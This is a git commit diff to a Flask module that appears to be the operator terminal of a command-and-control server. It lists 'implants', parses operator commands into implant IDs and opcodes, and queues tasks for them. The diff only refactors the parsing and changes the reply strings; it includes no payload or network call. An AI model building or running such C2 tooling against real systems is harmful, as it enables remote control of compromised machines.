73573982d4ecbfdcea81be7cb2c5342374857af9
Ubuntu <ubuntu@ip-172-31-26-122.us-east-2.compute.internal>
2024-04-23 03:59:25 +0000

    terminal printing responses

--- cvnt/cvnt/blueprint_terminal.py
+++ cvnt/cvnt/blueprint_terminal.py
@@ -31,41 +31,44 @@ def index():
         return redirect(url_for('basic.login_success'))
     implants = get_list()
     whole = None
-    response = None 
     rest_string = ' '
     if form.validate_on_submit():
-        whole = form.cmd.data
-        words = whole.split()
-        if len(words) == 1:
-            if words[0] in server_commands:
-                print('printing??????')
-                response = get_list()
-            else:
-                response = 'Invalid Command Loser :('
-                cmd = words[0]
-        elif len(words) == 2:
-            if words[1] in opcodes:
-                implant_id = words[0]
-                cmd = words[1]
-                handle_task_request(implant_id, cmd, rest_string)
-            else:
-                response = 'Invalid Command Loser :('
-                cmd = ' '.join(words)
-        else:
-            if words[1] in opcodes:
-                first_two_words = words[:2]
-                implant_id = first_two_words[0]
-                cmd = first_two_words[1]
-                rest_of_words = words[2:]
-                rest_string = ' '.join(rest_of_words)
-                handle_task_request(implant_id, cmd, rest_string)
-            else:
-                response = 'Invalid Command Loser :('  # Set the error message
-                cmd = ' '.join(words)
+        response = analyze_input(form)
+    else:
+        response = "Welcome to the party :)"
     return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)
 
-def analyze_input(cmd, args):
-    pass
+def analyze_input(form):
+    whole = form.cmd.data
+    words = whole.split()
+    rest_string = ''
+    if len(words) == 1:
+        if words[0] in server_commands:
+            print('printing??????')
+            response = get_list()
+        else:
+            response = 'Invalid Command Loser :('
+            cmd = words[0]
+    elif len(words) == 2:
+        if words[1] in opcodes:
+            implant_id = words[0]
+            cmd = words[1]
+            response = handle_task_request(implant_id, cmd, rest_string)
+        else:
+            response = 'Invalid Command Loser :('
+            cmd = ' '.join(words)
+    else:
+        if words[1] in opcodes:
+            first_two_words = words[:2]
+            implant_id = first_two_words[0]
+            cmd = first_two_words[1]
+            rest_of_words = words[2:]
+            rest_string = ' '.join(rest_of_words)
+            response = handle_task_request(implant_id, cmd, rest_string)
+        else:
+            response = 'Invalid Command Loser :(' 
+            cmd = ' '.join(words)
+    return response
 
 def handle_local_request(cmd, args):
     pass
@@ -85,7 +88,7 @@ def handle_task_request(implant_id, cmd, args):
     print("added task")
     db.session.commit()
     print("committed task")
-    return "True"
+    return "Slay baddie your command was recived successfully"
 
 @term.route(response, methods=["POST"])
 def handle_t_response(implant_id, jobID, output):
